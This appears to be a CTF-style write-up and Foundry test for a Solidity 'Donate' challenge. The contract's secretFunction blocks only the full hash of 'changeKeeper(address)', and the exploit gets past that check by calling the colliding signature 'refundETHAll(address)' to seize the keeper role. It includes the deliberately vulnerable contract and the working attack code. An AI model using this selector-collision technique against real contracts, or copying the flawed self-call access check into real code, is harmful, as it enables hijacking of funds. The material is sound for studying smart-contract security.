## DonateHack attack

The Donate contract has a onlyOwner modifier that checks that the msg.sender is the `owner` or the Contract itselfe.  
Also the contract has a `secretFunction` that will call itself with arbitrary data.  
The only check in `secretFunction` is, that the `string memory f` is not 0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428 what resolves to the keccak256 of changeKeeper(address).

As we need to call the function `changeKeeper(address)` to update the `keeper` we need to find another function signature (0x09779838) that will take in a single address as the argument and result in another keccak256.

To find a match we can use the signature DB from samczsun https://openchain.xyz/signatures?query=0x09779838 - if there wouldn't be two possible funcitons for 0x09779838 we could try to brutforce to generate another keccak256 hash with xxxx(address) that results in 0x09779838......

## Test
forge test --match-contract=donateHack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    function testhack() public {
        vm.startPrank(hacker);
		assertFalse(donate.keeperCheck()); // currently we're not the keeper
        // Hack Time        

        // https://openchain.xyz/signatures?query=0x09779838
        // refundETHAll(address) = 0x09779838 = changeKeeper(address)
        donate.secretFunction("refundETHAll(address)");

        assertTrue(donate.keeperCheck()); // now we're the keeper
    }
}

contract Donate {
    event t1(bytes _sig);
    address payable public keeper;
    address public owner;
    event newDonate(address indexed, uint amount);

    modifier onlyOwner() {
        require(
            msg.sender == owner || msg.sender == address(this),
            "You are not Owner"
        );
        _;
    }

    constructor(address _keeper) {
        keeper = payable(_keeper);
        owner = msg.sender;
    }

    function pay() external payable {
        keeper.transfer(msg.value);
        emit newDonate(msg.sender, msg.value);
    }

    function changeKeeper(address _newKeeper) external onlyOwner {
        keeper = payable(_newKeeper);
    }

    function secretFunction(string memory f) external {
        require(
            keccak256(bytes(f)) !=
                0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428,
            "invalid"
        );
        (bool success, ) = address(this).call(
            abi.encodeWithSignature(f, msg.sender)
        );
        require(success, "call fail");
    }

    function keeperCheck() external view returns (bool) {
        return (msg.sender == keeper);
    }
}
```